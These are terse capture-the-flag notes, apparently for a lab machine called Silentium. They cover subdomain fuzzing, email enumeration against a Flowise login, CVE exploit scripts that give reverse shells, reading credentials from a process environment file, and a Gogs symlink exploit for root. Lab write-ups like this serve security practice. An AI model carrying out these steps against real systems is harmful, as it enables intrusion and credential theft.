@@ -1,0 +1,37 @@
+[Profile]{
+Machine: Silentium 
+ip: 10.129.232.194
+}
+
+[Enumeration]{
+nmap -> silent-enum
+
+silentium.htb
+  ctrl+U -> tailwind, js
+            assets/app.js, assets/style.css
+  fuzzing -> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -fs 178 -> staging --> staging.silentium.htb
+
+staging.silentium.htb --> Flowiseai
+  curl -s http://staging.silentium.htb/api/v1/version -> {"version":"3.0.5"}
+  curl -s -X POST http://staging.silentium.htb/api/v1/auth/login   -H "Content-Type: application/json"   -d '{"email":"ben@silentium.htb","password":"test"}' -> {"statusCode":401,"success":false,"message":"Incorrect Email or Password","stack":{} --> The email ben@silentium.htb exists !
+
+python CVE-2025-58434-59528/flowise_chain.py -t http://staging.silentium.htb/ -e ben@silentium.htb ----> we got a reverse shell
+
+}
+
+[Exploitation]{
+We got a shell in dock so restricted.. check environment variables. 
+cat /proc/1/environ --> FLOWISE_USERNAME=ben SMTP_PASSWORD=r04D!!_R4ge
+Then we try to ssh with these credentials.
+And we got it. Nice!
+
+}
+
+[PrivEsc]{
+sudo -l --> :{ --> checking internal services: netstat -tulpn ---> Gogs(v0.13.0)
+Port forwarding ssh -L 3001:127.0.0.7:3001 ben@silentium.htb to create or sign up a gogs user ons the gogs server.
+Then use the symblink vulnerability of gogs in CVE-2025-8110 6235a0e377f1f48cb953b41810216b068369b129
+
+Then we use the CVE-2025-8110/CVE-2025-8110.py, making sure to adapt the username and the token in the code, and we got our root reverse shell.
+Great ! // zuper! //
+}
